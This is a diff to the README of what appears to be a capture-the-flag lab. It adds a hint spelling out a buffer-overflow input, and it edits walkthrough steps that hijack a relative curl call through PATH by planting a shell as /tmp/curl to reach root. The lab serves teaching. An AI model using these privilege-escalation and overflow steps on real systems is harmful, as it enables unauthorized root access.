@@ -28,6 +28,13 @@ Start the program with ``./launch_me``.
   Maybe try spam of ``A`` (somewhere between 1 and 35) ``1`` on the end?
   ```
 	</details>
+	<details>
+ 	<summary>Click me, when you really cant find overflow</summary>
+
+  ```
+  AAAAAAAAAAAAAAAAAAAAAAAAAAAA1 (28x A)
+  ```
+	</details>
 + **Second flag: Hijack the path for relative curl call in the program for shell and escalate privilege to root!**
 	* ``$ strings exploit_this`` to get information about the compiled file. <br>
 	* ``$ curl -I localhost`` - curl is called without full path using $PATH variable! <br>
@@ -37,7 +44,7 @@ Start the program with ``./launch_me``.
 
   ```bash
   strings launch_me
-  echo /usr/bin > /tmp/curl
+  echo /usr/bin/sh > /tmp/curl
   #this one is easy, give all privileges to curl (use chmod)
   export PATH=/tmp:$PATH
   #cd back to the repo file
